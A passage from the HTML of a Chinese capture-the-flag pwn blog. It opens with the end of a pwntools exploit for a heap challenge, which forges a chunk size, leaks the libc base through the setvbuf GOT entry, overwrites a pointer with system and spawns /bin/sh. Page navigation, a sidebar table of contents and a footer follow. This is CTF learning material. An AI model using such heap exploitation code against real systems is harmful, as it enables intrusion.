class="number">0x21</span>,<span class="string">'A\n'</span>,<span class="string">'N'</span>)<span class="comment">#伪造size，伪造size是为了 保存函数信息申请到目标chunk，要先free，绕过free检查.</span></span><br><span class="line">do_pass()</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc 9</span></span><br><span class="line"><span class="comment"># 16</span></span><br><span class="line"></span><br><span class="line">one_day(<span class="number">6</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    do_pass()</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">one_day(<span class="number">10</span>)</span><br><span class="line">setvbuf = elf.got[<span class="string">"setvbuf"</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x17</span>,p64(text_base+setvbuf)+<span class="string">'\n'</span>,<span class="string">'N'</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">libc_base=u64(a.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-libc.symbols[<span class="string">"setvbuf"</span>]</span><br><span class="line">success(<span class="string">"libc_base ==&gt; 0x%x"</span>%libc_base)</span><br><span class="line">a.sendlineafter(<span class="string">"\n"</span>,<span class="string">"Y"</span>)</span><br><span class="line">a.sendlineafter(<span class="string">"\n"</span>,<span class="string">"3"</span>)</span><br><span class="line">a.sendlineafter(<span class="string">"\n"</span>,<span class="string">"A"</span>*<span class="number">8</span>+p64(libc_base+libc.symbols[<span class="string">"system"</span>]))</span><br><span class="line">a.sendlineafter(<span class="string">"\n"</span>,<span class="string">"Y"</span>)</span><br><span class="line">a.sendlineafter(<span class="string">"\n"</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/28/VM-pwn-初探/" rel="next" title="VM pwn 初探">
+                <i class="fa fa-chevron-left"></i> VM pwn 初探
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/my.jpg" alt="ditto">
+            
+              <p class="site-author-name" itemprop="name">ditto</p>
+              <p class="site-description motion-element" itemprop="description">pwn for fun</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Dittozzz" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#babycpp"><span class="nav-number">1.</span> <span class="nav-text">babycpp</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#分析"><span class="nav-number">1.1.</span> <span class="nav-text">分析:</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#对象创建"><span class="nav-number">1.1.1.</span> <span class="nav-text">对象创建</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Edit函数"><span class="nav-number">1.1.2.</span> <span class="nav-text">Edit函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Update函数"><span class="nav-number">1.1.3.</span> <span class="nav-text">Update函数:</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#泄露堆地址"><span class="nav-number">1.2.1.</span> <span class="nav-text">泄露堆地址:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#伪造一个StringElement结构"><span class="nav-number">1.2.2.</span> <span class="nav-text">伪造一个StringElement结构:</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#完整exp"><span class="nav-number">1.3.</span> <span class="nav-text">完整exp:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#random"><span class="nav-number">2.</span> <span class="nav-text">random</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#程序分析"><span class="nav-number">2.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#预测随机数"><span class="nav-number">2.2.1.</span> <span class="nav-text">预测随机数:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#double-free"><span class="nav-number">2.2.2.</span> <span class="nav-text">double free</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#修改fd"><span class="nav-number">2.2.3.</span> <span class="nav-text">修改fd</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#伪造size"><span class="nav-number">2.2.4.</span> <span class="nav-text">伪造size</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#完整exp-1"><span class="nav-number">2.3.</span> <span class="nav-text">完整exp:</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ditto</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">49.8k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
